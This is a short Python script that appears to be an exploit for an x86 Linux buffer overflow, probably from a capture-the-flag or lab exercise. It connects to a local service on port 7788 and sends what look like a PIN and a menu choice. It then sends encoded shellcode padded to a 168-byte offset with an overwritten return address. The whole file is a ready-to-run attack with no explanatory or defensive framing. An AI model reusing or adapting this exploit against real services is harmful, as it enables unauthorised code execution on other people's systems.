#!/usr/bin/python3

import socket, sys, signal
from struct import pack

# Ctrl + c

def ctrl_c(sig, frame):
    print("\n\t[!] Quiting...\n\n")
    sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)

# Global vars

ip = "127.0.0.1"
port = 7788

# Malicious vars

offset = 168
shellcode = (b"\xb8\xae\x35\xa8\x2f\xd9\xc0\xd9\x74\x24\xf4\x5a\x33\xc9"
b"\xb1\x16\x83\xea\xfc\x31\x42\x10\x03\x42\x10\x4c\xc0\xc2"
b"\x24\xc8\xb2\x41\x5d\x80\xe9\x06\x28\xb7\x9a\xe7\x59\x5f"
b"\x5b\x90\xb2\xfd\x32\x0e\x44\xe2\x97\x26\x65\xe4\x17\xb7"
b"\xe8\x85\x64\xdf\xcc\x68\xe8\x3f\x2a\x10\x8f\x4c\x5c\xf4"
b"\x62\xda\xbc\xd2\x42\x33\xd9\x7f\xcd\x64\x55\x1c\x41\x54"
b"\xa4\xdb\x93\x84\xf7\x2d\xec\xf6\xc6\x7f\x3f\x3f\x06\x4b"
b"\x0b\x0c\x78\x83\x4d\x54\x49\xc4\xb1\xcf\xfa\x83\x53\x22"
b"\x7c")
eip = pack("<L", 0x8048563)

payload = shellcode + b"A"*(offset - len(shellcode)) + eip + b"\n"

# Buffer Overflow x86 linux

def main():

    # Conection

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    s.recv(1024)
    s.send(b"48093572\n")
    s.recv(1024)
    s.send(b"3\n")
    s.recv(1024)
    s.send(payload)
    #s.close()


if __name__ == "__main__":
    main()
